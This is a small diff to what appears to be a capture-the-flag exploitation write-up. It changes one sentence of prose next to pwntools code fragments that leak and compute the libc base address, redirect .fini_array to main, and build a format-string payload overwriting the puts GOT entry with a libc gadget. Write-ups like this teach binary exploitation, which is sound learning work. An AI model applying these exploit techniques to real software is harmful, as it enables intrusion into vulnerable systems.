@@ -106,7 +106,7 @@ libc.address = int(_,16) - libc.sym.__libc_start_main - libc_start_main_offset
 log.info('libc.address: ' + hex(libc.address))
 ```
 
-First pass, just leak and compute libc, then set `.fini_array` to `main` and on exit we score a second pass.
+First pass, just leak and compute libc, then set `.fini_array` to `main` and on end we score a second pass.
 
 ```python
 payload = fmtstr_payload(offset,{binary.got.puts:libc.sym.gadget})
